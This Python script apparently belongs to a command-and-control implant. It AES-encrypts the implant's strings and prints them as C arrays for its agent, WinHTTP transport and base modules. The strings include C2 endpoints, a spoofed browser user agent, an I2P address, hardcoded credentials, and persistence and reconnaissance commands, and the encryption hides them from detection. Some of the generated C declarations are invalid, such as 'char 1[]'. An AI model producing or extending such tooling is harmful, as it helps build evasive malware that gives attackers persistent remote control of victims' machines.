import os
from Crypto.Cipher import AES
from Crypto.Random import get_random_bytes
from Crypto.Util.Padding import pad
import hashlib

KEY = get_random_bytes(16)

def aesenc(data, key):
    iv = 16 * b'\x00'
    cipher = AES.new(hashlib.sha256(key).digest(), AES.MODE_CBC, iv)
    ciphertext = cipher.encrypt(pad(data, AES.block_size))
    
    return ciphertext

agent_str_list = [b"/taskings", b"/login", b"/results"]
transport_str_list = [b"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/119.0.0.0 Safari/537.36", b"http://localhost:4444", b"<local>", b"w4xjvtyof46assmxl62r5nnhbwdiu4xa2t3fd6hqrduxs366bhja.b32.i2p", b"GET", b"POST", b"Content-Type: application/x-www-form-urlencoded", b"username=serveradmin&password=MySup3rS3cr3tP@$$w0rd!", b"Content-Type: application/json"]
base_str_list = [b"command", b"whoami", b"hostname", b"pwd", b"add-persistence", b"del-persistence", b"exit"]

print('agent.c encrypted strings')
for index, s in enumerate(agent_str_list, start=1):
    ciphertext = aesenc(s + b"\x00", KEY)
    rext = os.path.splitext(s)[0]
    print(f'char {index}[]' + ' = { 0x' + ', 0x'.join(hex(x)[2:] for x in ciphertext) + ' };')

print('transport_winhttp.c encrypted strings')
print('char key[] = { 0x' + ', 0x'.join(hex(x)[2:] for x in KEY) + ' };')
for index, s in enumerate(transport_str_list, start=1):
    ciphertext = aesenc(s + b"\x00", KEY)
    rext = os.path.splitext(s)[0]
    print(f'char {index}[]' + ' = { 0x' + ', 0x'.join(hex(x)[2:] for x in ciphertext) + ' };')

print('base.c encrypted strings')
print('char key[] = { 0x' + ', 0x'.join(hex(x)[2:] for x in KEY) + ' };')
for index, s in enumerate(base_str_list, start=1):
    ciphertext = aesenc(s + b"\x00", KEY)
    rext = os.path.splitext(s)[0]
    print(f'char {index}[]' + ' = { 0x' + ', 0x'.join(hex(x)[2:] for x in ciphertext) + ' };')